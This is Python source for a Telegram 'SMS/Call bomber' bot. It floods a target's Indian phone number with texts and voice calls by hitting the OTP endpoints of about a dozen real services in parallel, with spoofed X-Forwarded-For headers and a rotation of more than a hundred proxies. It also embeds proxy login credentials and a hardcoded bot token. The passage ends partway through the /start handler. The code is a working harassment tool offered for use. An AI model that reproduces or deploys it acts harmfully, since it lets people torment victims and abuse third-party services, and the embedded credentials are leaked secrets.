#!/usr/bin/env python3
# ========== RAILWAY SPECIFIC SETTINGS ==========
import os
import sys

# Get Railway-specific environment variables
PORT = os.getenv('PORT', None)
RAILWAY_ENVIRONMENT = os.getenv('RAILWAY_ENVIRONMENT', 'production')
RAILWAY_GIT_COMMIT_SHA = os.getenv('RAILWAY_GIT_COMMIT_SHA', 'unknown')

print(f"🚂 Railway Environment: {RAILWAY_ENVIRONMENT}")
print(f"🔧 Commit SHA: {RAILWAY_GIT_COMMIT_SHA[:8] if RAILWAY_GIT_COMMIT_SHA != 'unknown' else 'unknown'}")
print(f"🌐 PORT: {PORT}")

import asyncio
import json
import random
import time
import urllib.parse
from typing import Dict, List, Tuple, Set
from collections import defaultdict
import aiohttp
from aiohttp import ClientSession, ClientTimeout
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application,
    CommandHandler,
    CallbackQueryHandler,
    ContextTypes,
    MessageHandler,
    filters
)
from telegram.constants import ParseMode
import logging
import signal
import atexit
import threading
from http.server import HTTPServer, BaseHTTPRequestHandler

# ========== CONFIGURATION ==========
# Get token from environment variable (Railway will inject this)
BOT_TOKEN = os.getenv("BOT_TOKEN", "8165905656:AAF3VSZLTvvLcyY73JdvPq8FWZPyPC7JNcw")
ADMIN_ID = 8291098446  # Your Telegram user ID

# Store user data (in production, consider using Redis)
user_sessions = {}  # user_id -> {start_time, phone, task}
user_stats = defaultdict(lambda: {"requests": 0, "success": 0, "failed": 0})
approved_users = set()  # Users with no time limit
admin_users = set([ADMIN_ID])  # Admin users
banned_users = set()  # Banned users
all_users = set()  # All users who have started the bot

# Global stats
global_stats = {
    "total_bombs": 0,
    "active_sessions": 0,
    "total_users": 0,
    "success_rate": 0.0,
    "total_requests": 0,
    "start_time": time.time()
}

# Configure logging for Railway
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO,
    handlers=[
        logging.StreamHandler(sys.stdout)
    ]
)
logger = logging.getLogger(__name__)

# Proxy configuration
PROXIES = [
    "px711001.pointtoserver.com:10780:purevpn0s12840722:vkgp6joz",
    "px043006.pointtoserver.com:10780:purevpn0s12840722:vkgp6joz",
    "px1160303.pointtoserver.com:10780:ppurevpn0s12840722:vkgp6joz",
    "px1400403.pointtoserver.com:10780:purevpn0s12840722:vkgp6joz",
    "px022409.pointtoserver.com:10780:purevpn0s12840722:vkgp6joz",
    "px013304.pointtoserver.com:10780:ppurevpn0s12840722:vkgp6joz",
    "px390501.pointtoserver.com:10780:ppurevpn0s12840722:vkgp6joz",
    "px060301.pointtoserver.com:10780:ppurevpn0s12840722:vkgp6joz",
    "px014236.pointtoserver.com:10780:ppurevpn0s12840722:vkgp6joz",
    "px950403.pointtoserver.com:10780:purevpn0s12840722:vkgp6joz",
    "px340403.pointtoserver.com:10780:purevpn0s12840722:vkgp6joz",
    "px016008.pointtoserver.com:10780:ppurevpn0s12840722:vkgp6joz",
    "px1210303.pointtoserver.com:10780:ppurevpn0s12840722:vkgp6joz",
    "px173003.pointtoserver.com:10780:purevpn0s12840722:vkgp6joz",
    "px500401.pointtoserver.com:10780:ppurevpn0s12840722:vkgp6joz",
    "px710701.pointtoserver.com:10780:ppurevpn0s12840722:vkgp6joz",
    "px041202.pointtoserver.com:10780:purevpn0s12840722:vkgp6joz",
    "px040805.pointtoserver.com:10780:ppurevpn0s12840722:vkgp6joz",
    "px580801.pointtoserver.com:10780:ppurevpn0s12840722:vkgp6joz",
    "px510201.pointtoserver.com:10780:purevpn0s12840722:vkgp6joz",
    "px990502.pointtoserver.com:10780:purevpn0s12840722:vkgp6joz",
    "px043004.pointtoserver.com:10780:purevpn0s12840722:vkgp6joz",
    "px810503.pointtoserver.com:10780:ppurevpn0s12840722:vkgp6joz",
    "px031901.pointtoserver.com:10780:ppurevpn0s12840722:vkgp6joz",
    "px210404.pointtoserver.com:10780:purevpn0s12840722:vkgp6joz",
    "px100801.pointtoserver.com:10780:ppurevpn0s12840722:vkgp6joz",
    "px031901.pointtoserver.com:10780:purevpn0s12840722:vkgp6joz",
    "px730503.pointtoserver.com:10780:purevpn0s12840722:vkgp6joz",
    "px350401.pointtoserver.com:10780:purevpn0s12840722:vkgp6joz",
    "px130501.pointtoserver.com:10780:ppurevpn0s12840722:vkgp6joz",
    "px380101.pointtoserver.com:10780:ppurevpn0s12840722:vkgp6joz",
    "px090404.pointtoserver.com:10780:purevpn0s12840722:vkgp6joz",
    "px490401.pointtoserver.com:10780:ppurevpn0s12840722:vkgp6joz",
    "px220601.pointtoserver.com:10780:purevpn0s12840722:vkgp6joz",
    "px410701.pointtoserver.com:10780:purevpn0s12840722:vkgp6joz",
    "px013401.pointtoserver.com:10780:purevpn0s12840722:vkgp6joz",
    "px052001.pointtoserver.com:10780:purevpn0s12840722:vkgp6joz",
    "px016007.pointtoserver.com:10780:purevpn0s12840722:vkgp6joz",
    "px1390303.pointtoserver.com:10780:purevpn0s12840722:vkgp6joz",
    "px016007.pointtoserver.com:10780:ppurevpn0s12840722:vkgp6joz",
    "px121102.pointtoserver.com:10780:purevpn0s12840722:vkgp6joz",
    "px390501.pointtoserver.com:10780:purevpn0s12840722:vkgp6joz",
    "px220601.pointtoserver.com:10780:ppurevpn0s12840722:vkgp6joz",
    "px013302.pointtoserver.com:10780:purevpn0s12840722:vkgp6joz",
    "px480301.pointtoserver.com:10780:ppurevpn0s12840722:vkgp6joz",
    "px010702.pointtoserver.com:10780:purevpn0s12840722:vkgp6joz",
    "px490402.pointtoserver.com:10780:ppurevpn0s12840722:vkgp6joz",
    "px320702.pointtoserver.com:10780:ppurevpn0s12840722:vkgp6joz",
    "px260901.pointtoserver.com:10780:purevpn0s12840722:vkgp6joz",
    "px241102.pointtoserver.com:10780:ppurevpn0s12840722:vkgp6joz",
    "px051703.pointtoserver.com:10780:purevpn0s12840722:vkgp6joz",
    "px032002.pointtoserver.com:10780:ppurevpn0s12840722:vkgp6joz",
    "px410701.pointtoserver.com:10780:ppurevpn0s12840722:vkgp6joz",
    "px022409.pointtoserver.com:10780:ppurevpn0s12840722:vkgp6joz",
    "px051005.pointtoserver.com:10780:purevpn0s12840722:vkgp6joz",
    "px430403.pointtoserver.com:10780:purevpn0s12840722:vkgp6joz",
    "px012702.pointtoserver.com:10780:ppurevpn0s12840722:vkgp6joz",
    "px370505.pointtoserver.com:10780:ppurevpn0s12840722:vkgp6joz",
    "px430403.pointtoserver.com:10780:ppurevpn0s12840722:vkgp6joz",
    "px241104.pointtoserver.com:10780:purevpn0s12840722:vkgp6joz",
    "px016102.pointtoserver.com:10780:purevpn0s12840722:vkgp6joz",
    "px173007.pointtoserver.com:10780:purevpn0s12840722:vkgp6joz",
    "px121101.pointtoserver.com:10780:purevpn0s12840722:vkgp6joz",
    "px591203.pointtoserver.com:10780:purevpn0s12840722:vkgp6joz",
    "px490701.pointtoserver.com:10780:purevpn0s12840722:vkgp6joz",
    "px730503.pointtoserver.com:10780:ppurevpn0s12840722:vkgp6joz",
    "px1210303.pointtoserver.com:10780:purevpn0s12840722:vkgp6joz",
    "px520401.pointtoserver.com:10780:ppurevpn0s12840722:vkgp6joz",
    "px1160303.pointtoserver.com:10780:purevpn0s12840722:vkgp6joz",
    "px570201.pointtoserver.com:10780:purevpn0s12840722:vkgp6joz",
    "px440401.pointtoserver.com:10780:ppurevpn0s12840722:vkgp6joz",
    "px420602.pointtoserver.com:10780:ppurevpn0s12840722:vkgp6joz",
    "px016501.pointtoserver.com:10780:ppurevpn0s12840722:vkgp6joz",
    "px014004.pointtoserver.com:10780:purevpn0s12840722:vkgp6joz",
    "px013301.pointtoserver.com:10780:purevpn0s12840722:vkgp6joz",
    "px710701.pointtoserver.com:10780:purevpn0s12840722:vkgp6joz",
    "px700403.pointtoserver.com:10780:ppurevpn0s12840722:vkgp6joz",
    "px591201.pointtoserver.com:10780:purevpn0s12840722:vkgp6joz",
    "px013601.pointtoserver.com:10780:purevpn0s12840722:vkgp6joz",
    "px331101.pointtoserver.com:10780:purevpn0s12840722:vkgp6joz",
    "px121001.pointtoserver.com:10780:purevpn0s12840722:vkgp6joz",
    "px320705.pointtoserver.com:10780:ppurevpn0s12840722:vkgp6joz",
    "px870303.pointtoserver.com:10780:purevpn0s12840722:vkgp6joz",
    "px460101.pointtoserver.com:10780:ppurevpn0s12840722:vkgp6joz",
    "px600303.pointtoserver.com:10780:purevpn0s12840722:vkgp6joz",
    "px591701.pointtoserver.com:10780:ppurevpn0s12840722:vkgp6joz",
    "px460101.pointtoserver.com:10780:purevpn0s12840722:vkgp6joz",
    "px043005.pointtoserver.com:10780:purevpn0s12840722:vkgp6joz",
    "px490402.pointtoserver.com:10780:purevpn0s12840722:vkgp6joz",
    "px040706.pointtoserver.com:10780:ppurevpn0s12840722:vkgp6joz",
    "px022408.pointtoserver.com:10780:purevpn0s12840722:vkgp6joz",
    "px060301.pointtoserver.com:10780:purevpn0s12840722:vkgp6joz",
    "px280301.pointtoserver.com:10780:ppurevpn0s12840722:vkgp6joz",
    "px380101.pointtoserver.com:10780:purevpn0s12840722:vkgp6joz",
    "px251002.pointtoserver.com:10780:ppurevpn0s12840722:vkgp6joz",
    "px1330403.pointtoserver.com:10780:purevpn0s12840722:vkgp6joz",
    "px023004.pointtoserver.com:10780:ppurevpn0s12840722:vkgp6joz",
    "px480301.pointtoserver.com:10780:purevpn0s12840722:vkgp6joz",
    "px016006.pointtoserver.com:10780:ppurevpn0s12840722:vkgp6joz",
    "px580801.pointtoserver.com:10780:purevpn0s12840722:vkgp6joz",
    "px570201.pointtoserver.com:10780:ppurevpn0s12840722:vkgp6joz",
    "px510201.pointtoserver.com:10780:ppurevpn0s12840722:vkgp6joz",
    "px591801.pointtoserver.com:10780:purevpn0s12840722:vkgp6joz",
    "px300902.pointtoserver.com:10780:purevpn0s12840722:vkgp6joz",
    "px591801.pointtoserver.com:10780:ppurevpn0s12840722:vkgp6joz",
    "px023004.pointtoserver.com:10780:purevpn0s12840722:vkgp6joz",
    "px013403.pointtoserver.com:10780:purevpn0s12840722:vkgp6joz",
    "px500401.pointtoserver.com:10780:purevpn0s12840722:vkgp6joz",
    "px032004.pointtoserver.com:10780:purevpn0s12840722:vkgp6joz",
    "px040805.pointtoserver.com:10780:purevpn0s12840722:vkgp6joz",
    "px400408.pointtoserver.com:10780:purevpn0s12840722:vkgp6joz",
    "px1260302.pointtoserver.com:10780:ppurevpn0s12840722:vkgp6joz",
    "px591201.pointtoserver.com:10780:ppurevpn0s12840722:vkgp6joz",
    "px180801.pointtoserver.com:10780:ppurevpn0s12840722:vkgp6joz",
    "px150902.pointtosender.com:10780:ppurevpn0s12840722:vkgp6joz",
    "px032002.pointtoserver.com:10780:purevpn0s12840722:vkgp6joz",
    "px040706.pointtoserver.com:10780:purevpn0s12840722:vkgp6joz",
    "px591701.pointtoserver.com:10780:purevpn0s12840722:vkgp6joz",
    "px022505.pointtoserver.com:10780:ppurevpn0s12840722:vkgp6joz",
    "px023005.pointtoserver.com:10780:ppurevpn0s12840722:vkgp6joz",
    "px140801.pointtoserver.com:10780:purevpn0s12840722:vkgp6joz",
    "px440401.pointtoserver.com:10780:purevpn0s12840722:vkgp6joz",
    "px100801.pointtoserver.com:10780:purevpn0s12840722:vkgp6joz"
]

# ========== ANIME STYLES ==========
ANIME_STYLES = {
    "header": "🌸✨",
    "success": "✅",
    "error": "❌",
    "warning": "⚠️",
    "info": "ℹ️",
    "fire": "🔥",
    "bomb": "💣",
    "phone": "📱",
    "shield": "🛡️",
    "crown": "👑",
    "star": "⭐",
    "heart": "❤️",
    "clock": "⏰",
    "rocket": "🚀",
    "lightning": "⚡",
    "skull": "💀",
    "ghost": "👻",
    "dragon": "🐉",
    "ninja": "🥷",
    "samurai": "⚔️",
    "back": "🔙",
    "hourglass": "⏳",
    "lock": "🔒",
    "unlock": "🔓",
    "zap": "⚡",
    "boom": "💥",
    "users": "👥"
}

# ========== PERSISTENCE FUNCTIONS ==========
def save_state():
    """Save bot state to file (for persistence across restarts)"""
    try:
        state = {
            "approved_users": list(approved_users),
            "admin_users": list(admin_users),
            "banned_users": list(banned_users),
            "all_users": list(all_users),
            "global_stats": global_stats
        }
        with open("bot_state.json", "w") as f:
            json.dump(state, f, indent=2)
        logger.info("✅ Bot state saved successfully")
    except Exception as e:
        logger.error(f"❌ Error saving state: {e}")

def load_state():
    """Load bot state from file"""
    try:
        if os.path.exists("bot_state.json"):
            with open("bot_state.json", "r") as f:
                state = json.load(f)
                approved_users.update(state.get("approved_users", []))
                admin_users.update(state.get("admin_users", []))
                banned_users.update(state.get("banned_users", []))
                all_users.update(state.get("all_users", []))
                global_stats.update(state.get("global_stats", global_stats))
            logger.info("✅ Bot state loaded successfully")
    except Exception as e:
        logger.error(f"❌ Error loading state: {e}")

# ========== HELPER FUNCTIONS ==========
def parse_proxy(proxy_str: str) -> Tuple[str, aiohttp.BasicAuth]:
    """Parse proxy string into URL and auth"""
    try:
        host_port, username, password = proxy_str.split(':')
        proxy_url = f"http://{host_port}"
        auth = aiohttp.BasicAuth(username, password)
        return proxy_url, auth
    except:
        # Fallback to no proxy
        return None, None

def get_random_proxy() -> Tuple[str, aiohttp.BasicAuth]:
    """Get random proxy from list"""
    if PROXIES:
        proxy_str = random.choice(PROXIES)
        return parse_proxy(proxy_str)
    return None, None

def is_admin(user_id: int) -> bool:
    """Check if user is admin"""
    return user_id in admin_users

def is_approved(user_id: int) -> bool:
    """Check if user is approved (admins are auto-approved)"""
    return user_id in admin_users or user_id in approved_users

def is_banned(user_id: int) -> bool:
    """Check if user is banned"""
    return user_id in banned_users

def format_number(number: str) -> str:
    """Format phone number with +91"""
    if len(number) == 10:
        return f"+91{number}"
    return number

def get_anime_banner() -> str:
    """Generate anime-style banner"""
    return f"""
{ANIME_STYLES['dragon']}{ANIME_STYLES['ninja']}{ANIME_STYLES['fire']}{ANIME_STYLES['bomb']}{ANIME_STYLES['lightning']}{ANIME_STYLES['ghost']}
╔══════════════════════════════════════╗
║    {ANIME_STYLES['crown']}   𝐊𝐀𝐖𝐀𝐈 𝐁𝐎𝐌𝐁𝐄𝐑   {ANIME_STYLES['crown']}    ║
║   {ANIME_STYLES['rocket']} 𝔸𝕟𝕚𝕞𝕖 𝕊𝕄𝕊/ℂ𝕒𝕝𝕝 𝔹𝕠𝕞𝕓𝕖𝕣 {ANIME_STYLES['rocket']}   ║
╠══════════════════════════════════════╣
║ {ANIME_STYLES['star']}  𝕄𝕒𝕕𝕖 𝕓𝕪: @𝕫𝕖𝕣𝕠𝕔𝕪𝕡𝕙      {ANIME_STYLES['star']}  ║
║ {ANIME_STYLES['heart']} ℙ𝕠𝕨𝕖𝕣𝕖𝕕 𝕓𝕪: @𝕫𝕖𝕣𝕠𝕔𝕪𝕡𝕙  {ANIME_STYLES['heart']}  ║
╚══════════════════════════════════════╝
"""

def get_attack_animation() -> List[str]:
    """Get attack animations"""
    return [
        f"{ANIME_STYLES['fire']} 𝔽𝕚𝕣𝕚𝕟𝕘 𝕞𝕚𝕤𝕤𝕚𝕝𝕖𝕤...",
        f"{ANIME_STYLES['lightning']} ℂ𝕙𝕒𝕣𝕘𝕚𝕟𝕘 𝕖𝕟𝕖𝕣𝕘𝕪...",
        f"{ANIME_STYLES['ghost']} 𝔾𝕙𝕠𝕤𝕥 𝕡𝕣𝕠𝕥𝕠𝕔𝕠𝕝 𝕖𝕟𝕘𝕒𝕘𝕖𝕕...",
        f"{ANIME_STYLES['ninja']} ℕ𝕚𝕟𝕛𝕒 𝕤𝕥𝕣𝕚𝕜𝕖 𝕚𝕟𝕚𝕥𝕚𝕒𝕥𝕖𝕕...",
        f"{ANIME_STYLES['dragon']} 𝔻𝕣𝕒𝕘𝕠𝕟 𝕓𝕣𝕖𝕒𝕥𝕙 𝕒𝕔𝕥𝕚𝕧𝕒𝕥𝕖𝕕...",
        f"{ANIME_STYLES['bomb']} ℂ𝕝𝕦𝕤𝕥𝕖𝕣 𝕓𝕠𝕞𝕓𝕤 𝕕𝕖𝕡𝕝𝕠𝕪𝕖𝕕...",
        f"{ANIME_STYLES['rocket']} ℝ𝕠𝕔𝕜𝕖𝕥 𝕓𝕒𝕣𝕣𝕒𝕘𝕖 𝕗𝕚𝕣𝕚𝕟𝕘...",
        f"{ANIME_STYLES['skull']} 𝕊𝕜𝕦𝕝𝕝 𝕔𝕣𝕦𝕤𝕙𝕖𝕣 𝕖𝕟𝕘𝕒𝕘𝕖𝕕..."
    ]

# ========== ENHANCED BOMBING CORE ==========
API_CONFIGS = [
    {
        "name": "Hungama",
        "endpoint": "https://communication.api.hungama.com/v1/communication/otp",
        "method": "POST",
        "payload": {
            "mobileNo": "{phone}",
            "countryCode": "+91",
            "appCode": "un",
            "messageId": "1",
            "emailId": "",
            "subject": "Register",
            "priority": "1",
            "device": "web",
            "variant": "v1",
            "templateCode": 1
        },
        "headers": {
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36",
            "Content-Type": "application/json",
            "X-Forwarded-For": "{ip}",
            "Client-IP": "{ip}"
        },
        "timeout": 2,
        "retry": True
    },
    {
        "name": "Meru Cab",
        "endpoint": "https://merucabapp.com/api/otp/generate",
        "method": "POST",
        "payload": {"mobile_number": "{phone}"},
        "headers": {
            "Mobilenumber": "{phone}",
            "Content-Type": "application/x-www-form-urlencoded",
            "X-Forwarded-For": "{ip}",
            "Client-IP": "{ip}"
        },
        "timeout": 2,
        "retry": True
    },
    {
        "name": "Dayco India",
        "endpoint": "https://ekyc.daycoindia.com/api/nscript_functions.php",
        "method": "POST",
        "payload": {"api": "send_otp", "brand": "dayco", "mob": "{phone}", "resend_otp": "resend_otp"},
        "headers": {
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "X-Forwarded-For": "{ip}",
            "Client-IP": "{ip}"
        },
        "timeout": 3,
        "retry": True
    },
    {
        "name": "Doubtnut",
        "endpoint": "https://api.doubtnut.com/v4/student/login",
        "method": "POST",
        "payload": {
            "phone_number": "{phone}",
            "language": "en"
        },
        "headers": {
            "content-type": "application/json; charset=utf-8",
            "X-Forwarded-For": "{ip}",
            "Client-IP": "{ip}"
        },
        "timeout": 3,
        "retry": True
    },
    {
        "name": "NoBroker",
        "endpoint": "https://www.nobroker.in/api/v3/account/otp/send",
        "method": "POST",
        "payload": {"phone": "{phone}", "countryCode": "IN"},
        "headers": {
            "Content-Type": "application/x-www-form-urlencoded",
            "X-Forwarded-For": "{ip}",
            "Client-IP": "{ip}"
        },
        "timeout": 2,
        "retry": True
    },
    {
        "name": "Shiprocket",
        "endpoint": "https://sr-wave-api.shiprocket.in/v1/customer/auth/otp/send",
        "method": "POST",
        "payload": {"mobileNumber": "{phone}"},
        "headers": {
            "Content-Type": "application/json",
            "X-Forwarded-For": "{ip}",
            "Client-IP": "{ip}"
        },
        "timeout": 2,
        "retry": True
    },
    {
        "name": "Tata Capital",
        "endpoint": "https://mobapp.tatacapital.com/DLPDelegator/authentication/mobile/v0.1/sendOtpOnVoice",
        "method": "POST",
        "payload": {"phone": "{phone}", "isOtpViaCallAtLogin": "true"},
        "headers": {
            "Content-Type": "application/json",
            "X-Forwarded-For": "{ip}",
            "Client-IP": "{ip}"
        },
        "timeout": 3,
        "retry": False
    },
    {
        "name": "PenPencil",
        "endpoint": "https://api.penpencil.co/v1/users/resend-otp?smsType=2",
        "method": "POST",
        "payload": {"mobile": "{phone}"},
        "headers": {
            "content-type": "application/json; charset=utf-8",
            "X-Forwarded-For": "{ip}",
            "Client-IP": "{ip}"
        },
        "timeout": 2,
        "retry": True
    },
    {
        "name": "1mg",
        "endpoint": "https://www.1mg.com/auth_api/v6/create_token",
        "method": "POST",
        "payload": {"number": "{phone}", "otp_on_call": True},
        "headers": {
            "content-type": "application/json; charset=utf-8",
            "X-Forwarded-For": "{ip}",
            "Client-IP": "{ip}"
        },
        "timeout": 2,
        "retry": True
    },
    {
        "name": "Swiggy",
        "endpoint": "https://profile.swiggy.com/api/v3/app/request_call_verification",
        "method": "POST",
        "payload": {"mobile": "{phone}"},
        "headers": {
            "content-type": "application/json; charset=utf-8",
            "X-Forwarded-For": "{ip}",
            "Client-IP": "{ip}"
        },
        "timeout": 2,
        "retry": True
    },
    {
        "name": "KPN Fresh",
        "endpoint": "https://api.kpnfresh.com/s/authn/api/v1/otp-generate?channel=WEB&version=1.0.0",
        "method": "POST",
        "payload": {"phone_number": {"number": "{phone}", "country_code": "+91"}},
        "headers": {
            "content-type": "application/json",
            "X-Forwarded-For": "{ip}",
            "Client-IP": "{ip}"
        },
        "timeout": 2,
        "retry": True
    },
    {
        "name": "Servetel",
        "endpoint": "https://api.servetel.in/v1/auth/otp",
        "method": "POST",
        "payload": {"mobile_number": "{phone}"},
        "headers": {
            "Content-Type": "application/x-www-form-urlencoded; charset=utf-8",
            "X-Forwarded-For": "{ip}",
            "Client-IP": "{ip}"
        },
        "timeout": 2,
        "retry": True
    }
]

async def send_request_fast(session: ClientSession, api_config: Dict, phone: str, user_id: int):
    """Ultra-fast request sending with proxy rotation"""
    try:
        # Get random proxy
        proxy_url, proxy_auth = get_random_proxy()
        
        # Prepare data
        formatted_phone = format_number(phone)
        ip_address = f"192.168.{random.randint(1, 255)}.{random.randint(1, 255)}"
        
        # Format payload and headers
        payload = {}
        for k, v in api_config["payload"].items():
            if isinstance(v, str):
                payload[k] = v.format(phone=formatted_phone)
            elif isinstance(v, bool):
                payload[k] = v
            else:
                payload[k] = str(v)
        
        headers = {}
        for k, v in api_config["headers"].items():
            if isinstance(v, str):
                headers[k] = v.format(phone=formatted_phone, ip=ip_address)
            else:
                headers[k] = str(v)
        
        # Use per-API timeout
        timeout = ClientTimeout(total=api_config.get("timeout", 2))
        
        connector = aiohttp.TCPConnector(ssl=False, limit=100)
        
        if api_config["method"] == "POST":
            if "application/x-www-form-urlencoded" in headers.get("Content-Type", ""):
                payload_str = "&".join(f"{k}={urllib.parse.quote(str(v))}" for k, v in payload.items())
                async with session.post(
                    api_config["endpoint"],
                    data=payload_str,
                    headers=headers,
                    timeout=timeout,
                    proxy=proxy_url,
                    proxy_auth=proxy_auth,
                    connector=connector
                ) as response:
                    status = response.status
                    # Don't await response.read() - faster
                    response.close()
            else:
                async with session.post(
                    api_config["endpoint"],
                    json=payload,
                    headers=headers,
                    timeout=timeout,
                    proxy=proxy_url,
                    proxy_auth=proxy_auth,
                    connector=connector
                ) as response:
                    status = response.status
                    response.close()
        else:
            return None, api_config["name"]
        
        # Update stats
        user_stats[user_id]["requests"] += 1
        global_stats["total_requests"] += 1
        
        if status in [200, 201, 202, 204]:
            user_stats[user_id]["success"] += 1
            return True, api_config["name"]
        else:
            user_stats[user_id]["failed"] += 1
            return False, api_config["name"]
            
    except Exception as e:
        user_stats[user_id]["failed"] += 1
        global_stats["total_requests"] += 1
        return None, api_config["name"]
    finally:
        await connector.close()

async def bombing_attack_aggressive(phone: str, user_id: int, chat_id: int, context: ContextTypes.DEFAULT_TYPE):
    """Ultra-aggressive bombing attack function"""
    start_time = time.time()
    max_time = 3600  # 1 hour for non-approved users
    
    if is_approved(user_id):
        max_time = float('inf')  # No limit for approved users
    
    # Send starting message
    start_msg = await context.bot.send_message(
        chat_id=chat_id,
        text=f"""
{ANIME_STYLES['rocket']} *𝐀𝐓𝐓𝐀𝐂𝐊 𝐈𝐍𝐈𝐓𝐈𝐀𝐓𝐄𝐃* {ANIME_STYLES['rocket']}

{ANIME_STYLES['phone']} 𝐓𝐚𝐫𝐠𝐞𝐭: `{phone}`
{ANIME_STYLES['clock']} 𝐓𝐢𝐦𝐞 𝐋𝐢𝐦𝐢𝐭: {'𝕌𝕟𝕝𝕚𝕞𝕚𝕥𝕖𝕕' if is_approved(user_id) else '𝟙 ℍ𝕠𝕦𝕣'}
{ANIME_STYLES['fire']} 𝐌𝐨𝐝𝐞: 𝔸𝕘𝕘𝕣𝕖𝕤𝕤𝕚𝕧𝕖
{ANIME_STYLES['shield']} 𝐏𝐫𝐨𝐱𝐲: ℝ𝕠𝕥𝕒𝕥𝕚𝕟𝕘

{ANIME_STYLES['lightning']} *ℝ𝔼𝔸𝔻𝕐 𝕋𝕆 𝕃𝔸𝕌ℕℂℍ!* {ANIME_STYLES['lightning']}
        """,
        parse_mode=ParseMode.MARKDOWN
    )
    
    active_apis = API_CONFIGS.copy()
    attack_count = 0
    last_update = time.time()
    
    # Animation messages
    anim_msgs = []
    for i in range(3):
        anim_msg = await context.bot.send_message(
            chat_id=chat_id,
            text=get_attack_animation()[i]
        )
        anim_msgs.append(anim_msg)
    
    try:
        # Create aiohttp session with high concurrency
        connector = aiohttp.TCPConnector(limit=0, limit_per_host=0, ssl=False)
        
        while time.time() - start_time < max_time:
            if user_id not in user_sessions:
                break
                
            attack_count += 1
            
            # Update animation every 3 seconds
            current_time = time.time()
            if current_time - last_update > 3:
                try:
                    for i, msg in enumerate(anim_msgs):
                        await msg.edit_text(random.choice(get_attack_animation()))
                    last_update = current_time
                except:
                    pass
            
            # Ultra-aggressive: Send multiple requests in parallel batches
            batch_size = 5  # Send 5 batches in parallel
            for _ in range(batch_size):
                if user_id not in user_sessions or time.time() - start_time >= max_time:
                    break
                    
                async with aiohttp.ClientSession(connector=connector) as session:
                    # Create tasks for all active APIs
                    tasks = [send_request_fast(session, api, phone, user_id) for api in active_apis]
                    
                    # Execute all requests in parallel
                    results = await asyncio.gather(*tasks, return_exceptions=True)
                    
                    # Process results
                    successful_apis = []
                    for result in results:
                        if isinstance(result, Exception):
                            continue
                        success, api_name = result
                        if success is True:
                            successful_apis.append(api_name)
                    
                    # Update active APIs list
                    if successful_apis:
                        active_apis = [api for api in API_CONFIGS if api["name"] in successful_apis]
                    else:
                        active_apis = API_CONFIGS.copy()
                
                # Minimal delay between batches
                await asyncio.sleep(0.01)
            
            # Update status every 20 attacks
            if attack_count % 20 == 0:
                elapsed = int(time.time() - start_time)
                remaining = max(0, max_time - elapsed) if max_time != float('inf') else "∞"
                stats = user_stats[user_id]
                success_rate = (stats['success'] / stats['requests'] * 100) if stats['requests'] > 0 else 0
                
                status_text = f"""
{ANIME_STYLES['fire']} *𝐀𝐓𝐓𝐀𝐂𝐊 𝐈𝐍 𝐏𝐑𝐎𝐆𝐑𝐄𝐒𝐒* {ANIME_STYLES['fire']}

{ANIME_STYLES['bomb']} 𝐀𝐭𝐭𝐚𝐜𝐤𝐬: `{attack_count:,}`
{ANIME_STYLES['clock']} 𝐄𝐥𝐚𝐩𝐬𝐞𝐝: `{elapsed}s`
{ANIME_STYLES['hourglass']} 𝐑𝐞𝐦𝐚𝐢𝐧𝐢𝐧𝐠: `{remaining}s`
{ANIME_STYLES['rocket']} 𝐀𝐜𝐭𝐢𝐯𝐞 𝐀𝐏𝐈𝐬: `{len(active_apis)}`
{ANIME_STYLES['success']} 𝐒𝐮𝐜𝐜𝐞𝐬𝐬 𝐑𝐚𝐭𝐞: `{success_rate:.1f}%`

{ANIME_STYLES['lightning']} *𝔽𝕀ℝ𝔼 𝔸𝕋 𝕎𝕀𝕃𝕃!* {ANIME_STYLES['lightning']}
                """
                
                try:
                    await start_msg.edit_text(status_text, parse_mode=ParseMode.MARKDOWN)
                except:
                    pass
            
            # Ultra-aggressive delay
            await asyncio.sleep(0.05)
            
    except asyncio.CancelledError:
        pass
    except Exception as e:
        logger.error(f"Attack error: {e}")
    finally:
        # Clean up
        for msg in anim_msgs:
            try:
                await msg.delete()
            except:
                pass
        
        # Send completion message
        elapsed = int(time.time() - start_time)
        stats = user_stats[user_id]
        
        await context.bot.send_message(
            chat_id=chat_id,
            text=f"""
{ANIME_STYLES['shield']} *𝐀𝐓𝐓𝐀𝐂𝐊 𝐂𝐎𝐌𝐏𝐋𝐄𝐓𝐄𝐃* {ANIME_STYLES['shield']}

{ANIME_STYLES['bomb']} 𝐓𝐨𝐭𝐚𝐥 𝐀𝐭𝐭𝐚𝐜𝐤𝐬: `{attack_count:,}`
{ANIME_STYLES['clock']} 𝐃𝐮𝐫𝐚𝐭𝐢𝐨𝐧: `{elapsed}s`
{ANIME_STYLES['success']} 𝐒𝐮𝐜𝐜𝐞𝐬𝐬: `{stats['success']:,}`
{ANIME_STYLES['error']} 𝐅𝐚𝐢𝐥𝐞𝐝: `{stats['failed']:,}`
{ANIME_STYLES['star']} 𝐓𝐨𝐭𝐚𝐥 𝐑𝐞𝐪𝐮𝐞𝐬𝐭𝐬: `{stats['requests']:,}`

{ANIME_STYLES['star']} *𝕄𝕀𝕊𝕊𝕀𝕆ℕ 𝔸ℂℂ𝕆𝕄ℙ𝕃𝕀𝕊ℍ𝔼𝔻* {ANIME_STYLES['star']}
            """,
            parse_mode=ParseMode.MARKDOWN
        )
        
        # Remove user session
        if user_id in user_sessions:
            del user_sessions[user_id]
            global_stats["active_sessions"] = max(0, global_stats["active_sessions"] - 1)

# ========== TELEGRAM BOT HANDLERS ==========
async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /start command"""
    user_id = update.effective_user.id
    
    if is_banned(user_id):
        await update.message.reply_text(
            f"{ANIME_STYLES['skull']} *𝐘𝐎𝐔 𝐀𝐑𝐄 𝐁𝐀𝐍𝐍𝐄𝐃* {ANIME_STYLES['skull']}\n\n"
            "ℂ𝕠𝕟𝕥𝕒𝕔𝕥 @𝕫𝕖𝕣𝕠𝕔𝕪𝕡𝕙 𝕗𝕠𝕣 𝕒𝕡𝕡𝕖𝕒𝕝.",
            parse_mode=ParseMode.MARKDOWN
        )
        return
    
    all_users.add(user_id)
    global_stats["total_users"] = len(all_users)
    save_state()  # Auto-save
    
    keyboard = [
